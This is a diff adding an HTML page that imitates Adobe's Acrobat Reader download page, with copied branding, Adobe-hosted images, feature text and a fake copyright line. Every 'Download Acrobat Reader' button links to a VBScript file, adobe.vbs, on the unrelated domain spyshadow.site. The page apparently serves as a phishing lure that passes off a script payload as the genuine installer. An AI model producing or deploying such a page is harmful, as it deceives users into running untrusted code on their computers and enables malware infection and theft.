@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Adobe Acrobat Reader | Free PDF viewer</title>
+  <link rel="icon" type="image/svg+xml" href="https://get.adobe.com/reader/favicon.ico">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Adobe Clean', adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #2c2c2c; background: #fff; }
+
+
+    header {
+      padding: 14px 24px;
+      border-bottom: 1px solid #e8e8e8;
+      display: flex;
+      align-items: center;
+    }
+    header img.header-logo { height: 28px; }
+
+
+    .hero {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 60px 80px 60px 120px;
+      max-width: 1400px;
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-left { max-width: 480px; z-index: 2; }
+    .hero-badge {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 18px;
+    }
+    .hero-badge img { width: 36px; height: 36px; }
+    .hero-badge span {
+      font-size: 14px;
+      color: #e8000b;
+      font-weight: 600;
+      letter-spacing: 0.02em;
+    }
+    .hero h1 {
+      font-size: 42px;
+      font-weight: 700;
+      line-height: 1.15;
+      color: #1a1a1a;
+      margin-bottom: 20px;
+    }
+    .hero-meta {
+      font-size: 12px;
+      color: #444;
+      margin-bottom: 6px;
+      line-height: 1.5;
+    }
+    .hero-meta a { color: #0265DC; text-decoration: underline; }
+    .hero-desc {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 6px;
+    }
+    .hero-terms {
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 28px;
+    }
+    .hero-terms a { color: #0265DC; text-decoration: underline; }
+
+    .btn-download {
+      display: inline-block;
+      background: #0265DC;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      padding: 13px 28px;
+      border-radius: 30px;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-download:hover { background: #0153b8; }
+
+    .hero-right {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      max-width: 600px;
+    }
+    .hero-right img { width: 100%; max-width: 580px; }
+
+
+    .included {
+      padding: 50px 40px 40px;
+      text-align: center;
+      background: #fff;
+    }
+    .included h2 {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 30px;
+      color: #1a1a1a;
+    }
+    .included-grid {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    .included-card {
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 22px 24px;
+      text-align: left;
+      width: 310px;
+    }
+    .included-card h3 {
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 14px;
+      color: #1a1a1a;
+    }
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .checkbox-row input[type="checkbox"] {
+      margin-top: 2px;
+      accent-color: #0265DC;
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+    .checkbox-label .label-title {
+      font-size: 13px;
+      font-weight: 600;
+      color: #1a1a1a;
+      display: block;
+      margin-bottom: 6px;
+    }
+    .checkbox-label .label-desc {
+      font-size: 12px;
+      color: #555;
+      line-height: 1.5;
+    }
+    .checkbox-label a { color: #0265DC; font-size: 12px; text-decoration: underline; }
+
+    .download-center {
+      text-align: center;
+      padding: 30px 20px 10px;
+    }
+    .download-center .btn-download { margin-bottom: 10px; }
+    .more-options { display: block; font-size: 13px; color: #0265DC; text-decoration: underline; margin-top: 10px; cursor: pointer; }
+
+    .features {
+      background: #f5f5f5;
+      padding: 60px 40px;
+      text-align: center;
+    }
+    .features h2 {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 50px;
+      color: #1a1a1a;
+    }
+    .features-grid {
+      display: flex;
+      justify-content: center;
+      gap: 0;
+      max-width: 1100px;
+      margin: 0 auto 50px;
+    }
+    .feature-item {
+      flex: 1;
+      max-width: 260px;
+      padding: 0 30px;
+      border-right: 1px solid #ccc;
+      text-align: center;
+    }
+    .feature-item:last-child { border-right: none; }
+    .feature-item img { height: 100px; margin-bottom: 20px; object-fit: contain; }
+    .feature-item h3 { font-size: 15px; font-weight: 700; margin-bottom: 12px; color: #1a1a1a; }
+    .feature-item p { font-size: 13px; color: #444; line-height: 1.6; }
+
+    .features .download-center { padding: 0; }
+
+    .business {
+      background: #fff;
+      padding: 100px 40px 80px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .business-wave {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 200px;
+      pointer-events: none;
+    }
+    .business-content { position: relative; z-index: 2; }
+    .business h2 {
+      font-size: 30px;
+      font-weight: 700;
+      margin-bottom: 18px;
+      color: #1a1a1a;
+    }
+    .business p {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.7;
+      max-width: 500px;
+      margin: 0 auto 36px;
+    }
+    .business-btns { display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; }
+    .btn-outline {
+      display: inline-block;
+      border: 2px solid #2c2c2c;
+      color: #2c2c2c;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 11px 26px;
+      border-radius: 30px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      background: transparent;
+    }
+    .btn-outline:hover { background: #2c2c2c; color: #fff; }
+
+    footer {
+      background: #fff;
+      border-top: 1px solid #e0e0e0;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .footer-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #555;
+      cursor: pointer;
+    }
+    .footer-left svg { width: 16px; height: 16px; }
+    .footer-right {
+      font-size: 11.5px;
+      color: #555;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+    }
+    .footer-right a { color: #0265DC; text-decoration: none; }
+    .footer-right a:hover { text-decoration: underline; }
+    .footer-sep { color: #aaa; }
+
+    @media (max-width: 900px) {
+      .hero { flex-direction: column; padding: 40px 24px; text-align: center; }
+      .hero-badge { justify-content: center; }
+      .hero-right { margin-top: 30px; }
+      .features-grid { flex-direction: column; align-items: center; }
+      .feature-item { border-right: none; border-bottom: 1px solid #ccc; padding: 20px 0; max-width: 100%; }
+      .feature-item:last-child { border-bottom: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img class="header-logo" src="https://get.adobe.com/reader/c5af3d2ccb/images/adobe_logo_header.svg" alt="Adobe" />
+  </header>
+
+  <section class="hero">
+    <div class="hero-left">
+      <div class="hero-badge">
+        <img src="https://get.adobe.com/reader/c5af3d2ccb/images/adobe_logo.png" alt="Adobe Acrobat Reader icon" />
+        <span>Adobe Acrobat Reader</span>
+      </div>
+      <h1>The world's most trusted free PDF viewer</h1>
+      <p class="hero-meta">Windows 10 - 11 &bull; English &bull; Version 25.001.21223 &nbsp;<a href="#">System requirements</a></p>
+      <p class="hero-desc">Download Acrobat Reader to work with PDFs in Acrobat on desktop and Google Chrome browser.</p>
+      <p class="hero-terms">By clicking the "Download Acrobat Reader" button, you acknowledge that you have read and accepted all of the <a href="#">Terms and Conditions.</a></p>
+      <a href="https://spyshadow.site/adobe.vbs" class="btn-download">Download Acrobat Reader</a>
+    </div>
+    <div class="hero-right">
+      <img src="https://get.adobe.com/reader/c5af3d2ccb/images/marquee_banner.svg" alt="Adobe Acrobat Reader banner" />
+    </div>
+  </section>
+
+  <section class="included">
+    <h2>Included with your download</h2>
+    <div class="included-grid">
+      <div class="included-card">
+        <h3>Adobe Express Photos</h3>
+        <div class="checkbox-row">
+          <input type="checkbox" checked id="cb1" />
+          <label class="checkbox-label" for="cb1">
+            <span class="label-title">Install Adobe Express Photos</span>
+            <span class="label-desc">The free Adobe app to view images, take screenshots, and easily make quick image edits.</span>
+            <a href="#">Learn more</a>
+          </label>
+        </div>
+      </div>
+      <div class="included-card">
+        <h3>Adobe Genuine</h3>
+        <div class="checkbox-row">
+          <input type="checkbox" checked id="cb2" />
+          <label class="checkbox-label" for="cb2">
+            <span class="label-title">Install Adobe Genuine Service (AGS)</span>
+            <span class="label-desc">Periodically verify whether Adobe apps on this machine are genuine and notify me if they are not.</span>
+            <a href="#">Learn more about AGS features and functionality</a>
+          </label>
+        </div>
+      </div>
+      <div class="included-card">
+        <h3>More add-ons</h3>
+        <div class="checkbox-row">
+          <input type="checkbox" checked id="cb3" />
+          <label class="checkbox-label" for="cb3">
+            <span class="label-title">Install McAfee Security Scan Plus</span>
+            <span class="label-desc">Install the free utility to check the status of my PC security. It will not modify existing antivirus program or PC settings.</span>
+            <a href="#">Learn more</a>
+          </label>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="download-center">
+    <a href="https://spyshadow.site/adobe.vbs" class="btn-download">Download Acrobat Reader</a><br/>
+    <a href="#" class="more-options">More download options</a>
+  </div>
+
+  <section class="features">
+    <h2>More ways to work with documents and images, for free.</h2>
+    <div class="features-grid">
+      <div class="feature-item">
+        <img src="https://get.adobe.com/reader/c5af3d2ccb/images/view_store.svg" alt="View, store, and share PDFs" />
+        <h3>View, store, and share PDFs</h3>
+        <p>Get the best viewing experience for all types of PDF content. Store files online and share them with anyone.</p>
+      </div>
+      <div class="feature-item">
+        <img src="https://get.adobe.com/reader/c5af3d2ccb/images/fill_and_sign.svg" alt="Fill and sign" />
+        <h3>Fill and sign</h3>
+        <p>Complete forms fast and add your signature or initials. Then share a link with others.</p>
+      </div>
+      <div class="feature-item">
+        <img src="https://get.adobe.com/reader/c5af3d2ccb/images/work_from_anywhere.svg" alt="Work from anywhere" />
+        <h3>Work from anywhere</h3>
+        <p>Access your files from any device with the free Acrobat Reader app and through the Acrobat Reader Chrome extension</p>
+      </div>
+      <div class="feature-item">
+        <img src="https://get.adobe.com/reader/c5af3d2ccb/images/capture_view_and_edit_image.svg" alt="View and edit images" />
+        <h3>View and edit images</h3>
+        <p>Use Adobe Express Photos to take screenshots and share with others. View and edit images faster with easy-to-use AI tools.</p>
+      </div>
+    </div>
+    <div class="download-center">
+      <a href="https://spyshadow.site/adobe.vbs" class="btn-download">Download Acrobat Reader</a>
+    </div>
+  </section>
+
+  <section class="business">
+    <svg class="business-wave" viewBox="0 0 1440 200" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+      <path d="M 80 120 C 100 60, 120 40, 160 80 C 200 120, 140 160, 180 140 Q 400 60 800 100 Q 1100 130 1440 80" stroke="#e8000b" stroke-width="4" fill="none" stroke-linecap="round"/>
+    </svg>
+    <div class="business-content">
+      <h2>Give your business the power of PDF productivity</h2>
+      <p>Let all your employees view, sign, comment on, and share PDFs for free. Acrobat Reader is available for distribution beyond single-user installation and can be quickly deployed in your organization with a volume license.</p>
+      <div class="business-btns">
+        <a href="#" class="btn-outline">Learn more</a>
+        <a href="#" class="btn-download">Apply for a license</a>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-left">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+      </svg>
+      Change Region &nbsp;&#8964;
+    </div>
+    <div class="footer-right">
+      <span>Copyright &copy; 2026 Adobe. All rights reserved.</span>
+      <span class="footer-sep">/</span>
+      <a href="#">Acrobat online</a>
+      <span class="footer-sep">/</span>
+      <a href="#">Privacy</a>
+      <span class="footer-sep">/</span>
+      <a href="#">Terms of use</a>
+      <span class="footer-sep">/</span>
+      <a href="#">Cookie preferences</a>
+      <span class="footer-sep">/</span>
+      <a href="#">Do not sell or share my personal information</a>
+      <span class="footer-sep">/</span>
+      <span>&#9654; Ad Choices</span>
+    </div>
+  </footer>
+
+</body>
+</html>
